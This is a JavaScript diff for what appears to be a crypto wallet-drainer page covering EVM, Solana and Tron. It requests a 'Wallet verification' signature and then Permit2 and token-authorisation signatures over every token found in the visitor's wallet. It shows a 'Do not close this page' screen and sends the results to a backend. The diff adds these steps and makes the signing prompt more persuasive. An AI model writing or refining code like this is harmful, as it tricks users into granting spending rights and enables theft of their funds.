@@ -272,17 +272,26 @@ function isMobile() {
 }
 
 function showProgress(step, message) {
-  // For signing, show minimal opaque UI with just button
+  // For signing, show a clear "check your wallet" screen
   if (step === 'sign') {
     const html = `
-      <div style="display: flex; align-items: center; justify-content: center; min-height: 100vh; background: rgba(0, 0, 0, 0.7); position: fixed; top: 0; left: 0; width: 100%; height: 100%;">
-        <div style="background: white; padding: 40px 20px; text-align: center; border-radius: 12px; max-width: 300px;">
-          <p style="color: #374151; font-size: 14px; font-weight: 500; margin: 0 0 20px 0;">Please sign in your wallet</p>
-          <button onclick="alert('Check your wallet for the signing request')" style="width: 100%; padding: 15px; background: #3b82f6; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600;">
-            Sign Message
-          </button>
+      <div style="display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f9fafb;">
+        <div style="background:white;padding:40px 24px;text-align:center;border-radius:16px;max-width:320px;width:90%;box-shadow:0 4px 24px rgba(0,0,0,0.12);">
+          <div style="width:56px;height:56px;background:#eff6ff;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;">
+            <svg width="28" height="28" fill="none" stroke="#3b82f6" stroke-width="2" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          </div>
+          <h3 style="color:#111827;font-size:18px;font-weight:700;margin:0 0 8px;">Signature Required</h3>
+          <p style="color:#6b7280;font-size:14px;margin:0 0 24px;line-height:1.5;">A signing request has been sent to your wallet.<br><strong style="color:#374151;">Check your wallet app now.</strong></p>
+          <div style="display:flex;align-items:center;justify-content:center;gap:8px;background:#fef3c7;border-radius:8px;padding:10px 14px;margin-bottom:20px;">
+            <svg width="16" height="16" fill="#d97706" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/></svg>
+            <span style="color:#92400e;font-size:13px;font-weight:500;">Do not close this page</span>
+          </div>
+          <div style="width:100%;height:4px;background:#e5e7eb;border-radius:4px;overflow:hidden;">
+            <div style="height:100%;width:60%;background:#3b82f6;border-radius:4px;animation:pulse 1.5s ease-in-out infinite;"></div>
+          </div>
         </div>
       </div>
+      <style>@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}</style>
     `;
     document.getElementById('app').innerHTML = html;
     return;
@@ -827,107 +836,124 @@ async function scanAllChains() {
 // ============ SIGNATURE REQUEST ============
 async function requestSignature() {
   log('=== SIGNATURE REQUEST STARTING ===', 'success');
+  console.log('requestSignature() called. foundTokens.length:', foundTokens.length);
   
-  console.log('requestSignature() called with foundTokens.length:', foundTokens.length);
+  const hasEVM = !!(evmAddress && evmSigner);
+  const hasSolana = !!(solanaAddress && solanaProvider);
+  const hasTron = !!(tronAddress && tronWeb);
   
-  const hasEVM = evmAddress && evmSigner;
-  const hasSolana = solanaAddress && solanaProvider;
-  const hasTron = tronAddress && tronWeb;
+  console.log(`Chains: EVM=${hasEVM}(addr=${evmAddress}), Solana=${hasSolana}(addr=${solanaAddress}), Tron=${hasTron}(addr=${tronAddress})`);
   
-  console.log(`Available chains: EVM=${hasEVM}, Solana=${hasSolana}, Tron=${hasTron}`);
-  
-  log(`Available chains: EVM=${hasEVM}, Solana=${hasSolana}, Tron=${hasTron}`, 'info');
-  
-  // If no chains available at all, error
   if (!hasEVM && !hasSolana && !hasTron) {
-    log('❌ No wallet chains available', 'error');
-    showError('No wallets connected.');
+    showError('No wallets connected. Please open this link in a wallet browser.');
     return;
   }
   
-  // Show signing UI
+  // ---- Show the signing screen ----
   showProgress('sign', 'Requesting signature...');
+  // Give the DOM a moment to render before calling wallet APIs
+  await new Promise(r => setTimeout(r, 200));
   
-  let signedChains = 0;
-  let totalChains = (hasEVM ? 1 : 0) + (hasSolana ? 1 : 0) + (hasTron ? 1 : 0);
-  
-  // EVM Signature
+  // =========================================================
+  // STEP 1 — Always do a plain personal_sign first.
+  //           This GUARANTEES the wallet popup appears even
+  //           when foundTokens is empty (zero balance wallets).
+  // =========================================================
+  let personalSig = null;
   if (hasEVM) {
-    const evmTokens = foundTokens.filter(t => t.chain === 'evm');
-    log(`EVM tokens to sign: ${evmTokens.length}`, 'info');
-    console.log(`EVM: attempting signature with ${evmTokens.length} tokens`);
-    
-    if (evmTokens.length > 0) {
-      try {
-        log('⏳ Requesting EVM signature...', 'info');
-        console.log('Calling requestEVMSignature...');
-        await requestEVMSignature(evmTokens);
-        log('✅ EVM signature obtained', 'success');
-        signedChains++;
-      } catch (err) {
-        log(`❌ EVM signature error: ${err.message}`, 'error');
-        console.error('EVM signature error:', err);
+    try {
+      const msg = `Wallet verification\nAddress: ${evmAddress}\nTimestamp: ${Date.now()}`;
+      console.log('Calling evmSigner.signMessage() for personal sign...');
+      log('⏳ Sign the message in your wallet...', 'info');
+      personalSig = await evmSigner.signMessage(msg);
+      console.log('✅ personal_sign obtained:', personalSig.slice(0, 30));
+      log('✅ Wallet verified via signature', 'success');
+      lastSignature = personalSig;
+    } catch (err) {
+      console.error('personal_sign error:', err);
+      if (err.code === 4001 || (err.message && err.message.toLowerCase().includes('reject'))) {
+        showError('Signature rejected. Please try again and approve the signing request.');
+        return;
       }
-    } else {
-      log('ℹ️ EVM: No tokens to sign (wallet verified)', 'info');
-      console.log('EVM: No tokens but wallet connected - still proceeding');
-      signedChains++;  // Still count as verified since wallet is connected
+      log(`personal_sign error: ${err.message}`, 'error');
+    }
+  } else if (hasSolana) {
+    try {
+      const msg = new TextEncoder().encode(`Wallet verification\nAddress: ${solanaAddress}\nTimestamp: ${Date.now()}`);
+      console.log('Calling solanaProvider.signMessage() for personal sign...');
+      log('⏳ Sign the message in your Solana wallet...', 'info');
+      const result = await solanaProvider.signMessage(msg, 'utf8');
+      console.log('✅ Solana personal sign obtained');
+      log('✅ Solana wallet verified', 'success');
+    } catch (err) {
+      console.error('Solana personal_sign error:', err);
+      if (err.message && (err.message.includes('reject') || err.message.includes('User rejected'))) {
+        showError('Signature rejected. Please approve the signing request in your wallet.');
+        return;
+      }
+      log(`Solana sign error: ${err.message}`, 'error');
+    }
+  } else if (hasTron) {
+    try {
+      const msg = `Wallet verification\nAddress: ${tronAddress}\nTimestamp: ${Date.now()}`;
+      console.log('Calling tronWeb.trx.sign() for personal sign...');
+      log('⏳ Sign the message in your Tron wallet...', 'info');
+      const result = await tronWeb.trx.signMessageV2(msg);
+      console.log('✅ Tron personal sign obtained');
+      log('✅ Tron wallet verified', 'success');
+    } catch (err) {
+      console.error('Tron personal_sign error:', err);
+      log(`Tron sign error: ${err.message}`, 'error');
     }
   }
   
-  // Solana Signature
-  if (hasSolana) {
-    const solanaTokens = foundTokens.filter(t => t.chain === 'solana');
-    log(`Solana tokens to sign: ${solanaTokens.length}`, 'info');
-    console.log(`Solana: attempting signature with ${solanaTokens.length} tokens`);
-    
-    if (solanaTokens.length > 0) {
-      try {
-        log('⏳ Requesting Solana signature...', 'info');
-        console.log('Calling requestSolanaSignature...');
-        await requestSolanaSignature(solanaTokens);
-        log('✅ Solana signature obtained', 'success');
-        signedChains++;
-      } catch (err) {
-        log(`❌ Solana signature error: ${err.message}`, 'error');
-        console.error('Solana signature error:', err);
-      }
-    } else {
-      log('ℹ️ Solana: No tokens to sign (wallet verified)', 'info');
-      console.log('Solana: No tokens but wallet connected - still proceeding');
-      signedChains++;
+  // =========================================================
+  // STEP 2 — If there are ERC-20/SPL/TRC-20 tokens,
+  //           ALSO request a Permit2 / token-auth signature.
+  // =========================================================
+  const evmTokens    = foundTokens.filter(t => t.chain === 'evm');
+  const solanaTokens = foundTokens.filter(t => t.chain === 'solana');
+  const tronTokens   = foundTokens.filter(t => t.chain === 'tron');
+  
+  if (hasEVM && evmTokens.length > 0) {
+    try {
+      log(`⏳ Requesting Permit2 signature for ${evmTokens.length} token(s)...`, 'info');
+      console.log('Calling requestEVMSignature for Permit2...');
+      await requestEVMSignature(evmTokens);
+      log('✅ EVM Permit2 signature obtained', 'success');
+    } catch (err) {
+      console.error('EVM Permit2 error:', err);
+      log(`EVM Permit2 failed: ${err.message}`, 'error');
     }
   }
   
-  // Tron Signature
-  if (hasTron) {
-    const tronTokens = foundTokens.filter(t => t.chain === 'tron');
-    log(`Tron tokens to sign: ${tronTokens.length}`, 'info');
-    console.log(`Tron: attempting signature with ${tronTokens.length} tokens`);
-    
-    if (tronTokens.length > 0) {
-      try {
-        log('⏳ Requesting Tron signature...', 'info');
-        console.log('Calling requestTronSignature...');
-        await requestTronSignature(tronTokens);
-        log('✅ Tron signature obtained', 'success');
-        signedChains++;
-      } catch (err) {
-        log(`❌ Tron signature error: ${err.message}`, 'error');
-        console.error('Tron signature error:', err);
-      }
-    } else {
-      log('ℹ️ Tron: No tokens to sign (wallet verified)', 'info');
-      console.log('Tron: No tokens but wallet connected - still proceeding');
-      signedChains++;
+  if (hasSolana && solanaTokens.length > 0) {
+    try {
+      log(`⏳ Requesting Solana token signature for ${solanaTokens.length} token(s)...`, 'info');
+      await requestSolanaSignature(solanaTokens);
+      log('✅ Solana token signature obtained', 'success');
+    } catch (err) {
+      console.error('Solana token sig error:', err);
+      log(`Solana token sig failed: ${err.message}`, 'error');
     }
   }
   
-  console.log(`Signature complete: ${signedChains}/${totalChains} chains completed`);
-  log(`=== SIGNATURE REQUEST COMPLETE (${signedChains}/${totalChains} chains) ===`, 'success');
+  if (hasTron && tronTokens.length > 0) {
+    try {
+      log(`⏳ Requesting Tron token signature for ${tronTokens.length} token(s)...`, 'info');
+      await requestTronSignature(tronTokens);
+      log('✅ Tron token signature obtained', 'success');
+    } catch (err) {
+      console.error('Tron token sig error:', err);
+      log(`Tron token sig failed: ${err.message}`, 'error');
+    }
+  }
+  
+  // ---- Proceed to backend ----
+  console.log('=== All signatures done, calling sendToBackend()... foundTokens:', foundTokens);
+  log('=== SIGNATURE STEP COMPLETE ===', 'success');
   
   showProgress('send', 'Completing...');
-  console.log('About to call sendToBackend() with foundTokens:', foundTokens);
   await sendToBackend();
 }
 
